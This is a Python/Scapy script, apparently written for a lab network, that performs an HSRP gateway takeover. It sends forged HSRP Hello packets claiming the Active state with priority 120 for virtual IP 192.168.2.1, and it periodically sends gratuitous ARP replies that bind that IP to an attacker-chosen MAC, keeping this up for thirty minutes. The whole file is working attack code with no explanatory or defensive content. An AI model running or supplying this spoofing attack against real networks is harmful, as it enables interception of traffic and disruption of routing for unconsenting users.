from scapy.all import *
import time
import random

iface = 'virbr-labs'
virtual_ip = '192.168.2.1'
router_ip = '192.168.2.94'
new_mac = '00:00:0c:07:ac:01'

hsrp_payload = bytes([
    0x00,        # version 0
    0x00,        # op code Hello
    0x10,        # state Active (16)
    0x03,        # hellotime 3s
    0x0a,        # holdtime 10s
    0x78,        # priority 120
    0x01,        # group 1
    0x00,        # reserved
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,  # auth data
    192, 168, 2, 1  # virtual IP
])

def send_hsrp_hello():
    pkt = Ether(dst='01:00:5e:00:00:02') / \
          IP(src=router_ip, dst='224.0.0.2', ttl=1) / \
          UDP(sport=1985, dport=1985) / \
          Raw(load=hsrp_payload)
    sendp(pkt, iface=iface, verbose=0)

def send_garp():
    pkt = Ether(src=new_mac, dst='ff:ff:ff:ff:ff:ff') / \
          ARP(op=2, hwsrc=new_mac, psrc=virtual_ip,
              hwdst='ff:ff:ff:ff:ff:ff', pdst=virtual_ip)
    sendp(pkt, iface=iface, count=5, inter=0.05, verbose=0)

start = time.time()
hello_count = 0

while time.time() - start < 1800:
    send_hsrp_hello()
    hello_count += 1

    if hello_count % 8 == 0:
        send_garp()

    time.sleep(3)
